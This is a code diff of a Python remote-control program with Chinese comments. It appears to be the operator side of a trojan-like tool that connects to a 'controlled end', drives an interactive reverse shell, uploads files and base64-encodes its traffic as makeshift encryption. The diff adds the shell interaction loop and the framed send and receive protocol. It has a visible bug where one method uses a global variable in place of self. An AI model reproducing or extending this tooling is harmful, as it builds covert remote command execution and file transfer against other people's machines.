@@ -1,11 +1,13 @@
 # 和服务器相关的操作
 
 import socket
+import struct
 import sys
 import multiprocessing
 import threading
 import json
 import os.path
+import base64
 
 class BackGround:
     """后台运行 开启服务端口 接收被控制端发送的地址信息
@@ -114,9 +116,7 @@ class LuckyGirl:
         }
         self.show()
     
-        
-
-    
+     
     def show(self):
         print(f"ip = {self.ip}")
         print(f"port = {self.port}")
@@ -170,8 +170,6 @@ class LuckyGirl:
         
         #发送数据 ...
         
-        
-        
         # 保存返回结果
         if flag:
             try:
@@ -180,48 +178,67 @@ class LuckyGirl:
                     f.close()
             except Exception as e:
                 print(e)
-            
+    
+    def packet_length_recv(self):
+        """_summary_接收报文头获得数据长度
+
+        Args:
+            socket (socket): socket
+
+        Returns:
+            int: data_length
+        """
+        data_header = self.socket.recv(4)
+        data_length = struct.unpack('i',data_header)[0]
+        return data_length
+    
     def open_shell(self,msg):
         """打开反弹shell
 
         Args:
-            msg (list): ['shell','type']第二个参数为样式
+            msg (list): ['shell','exit']第二个参数为样式
         """
         end_flag = "exit"
-        # shell_type = msg[1]
-        recv_len = 1
+        shell_type = msg[1]
         response = ''
         
-        #发送命令
+        #发送shell交互命令
         output = self.direct_send(msg)
        
         try:
+            
             while True:
             #shell一行一行交互
+                command = input(shell_type)
+                if not command:continue
+                # 进行加密后再发送
                 
-                while recv_len:
-                    data = self.socket.recv(4096)
-                    recv_len = len(data)
-                    response += data.decode()
-                    
-                    if(recv_len < 4096):
-                        break
-                
-                if(response):
-                    print(response)
-                    
-                buffer = sys.stdin.readline()
-                print(f"buffer = {buffer}")
-                
-                if(buffer.rstrip() == end_flag):
+                #发送结束shell交互
+                if(command.rstrip() == end_flag):
                     break
                 else:
-                    self.socket.send(buffer.encode())
-                    print(f"[ * ] Send: {buffer}")
+                    self.direct_send(command + '\n')
+                                
+                # 接收4个字节的报头
+                data_length = self.packet_length_recv()
                 
-            self.socket.send((end_flag+"\n").encode())
-        except:
-            pass
+                recv_size = 0
+                recv_data = b''
+                
+                while(recv_size < data_length):
+                    temp_data = self.socket.recv(1024)
+                    recv_size += len(temp_data)
+                    recv_data += temp_data
+    
+                # 解密过程 传入bytes 传出原始数据
+                
+                recv_data = recv_data.decode()
+                print(recv_data)
+            
+            self.direct_send(end_flag)
+            
+        except Exception as e:
+            print(e)
     
     
     def connect_server(self):
@@ -239,18 +256,39 @@ class LuckyGirl:
             print(e)
     
     def direct_send(self,msg):
-        """将list数据转换成能够直接发送的数据,并且发送
+        """将数据转换成能够直接发送的数据,并且发送
+        流程:数据进行加密以后,获取数据长度,给它增加报文头后发送
 
         Args:
-            msg (list): _description_
+            msg (any): 任何需要发送的信息
         """
+        #数据长度
+        data_length = 0
+        
         try:
-            data = str(msg).encode()
-            self.socket.send(data)
-            return True
-        except Exception as e:
-            print(e)
+            #如果是list格式
+            if(isinstance(msg,list)):            
+                data = str(msg).encode()
+            #如果已经是字符串格式
+            elif (isinstance(msg,str)):
+                data = msg.encode()
+            else:
+                raise ValueError("非法的格式")
             
+            #暂时用base64编码 加密措施
+            data = base64.b64encode(data)
+            # 获取data的长度
+            data_length = len(data)
+            #打包成固定4字节的报头
+            data_header = struct.pack('i',data_length)
+            
+            #发送数据报头和数据组成的包 数据加密 报头不加密
+            self.socket.send(data_header+data)
+            
+            return True
+
+        except Exception as e:
+            print (e)
         return False
    
     
@@ -261,8 +299,24 @@ class LuckyGirl:
         # 执行对应的命令 从字典选取对应的type的func，然后第二个参数的传递的信息
         try:
             out = self.choose[type](msg)
+            #结束 接收最后信息
+            data_length = a.packet_length_recv()
+            recv_size = 0
+            recv_data = b''
+            
+            while(recv_size < data_length):
+                temp_data = self.socket.recv(1024)
+                recv_size += len(temp_data)
+                recv_data += temp_data
+            recv_data = recv_data.decode()
+            print(recv_data)
+            self.disconnet_server()
+            
+            
         except Exception as e:
             print(e)
+        
+        
         
         # self.disconnet_server()
     
@@ -274,7 +328,8 @@ if __name__ == "__main__":
     a = LuckyGirl('127.0.0.1',12345)
     
     a.connect_server()
-    a.send_msg('shell',['shell','Bxx#>'])
+    a.send_msg('upload',['save.txt','save5.txt'])
+    # a.send_msg('shell',['shell','Bxx#>'])
     # a.choose['upload']()
     
     # b = BackGround()
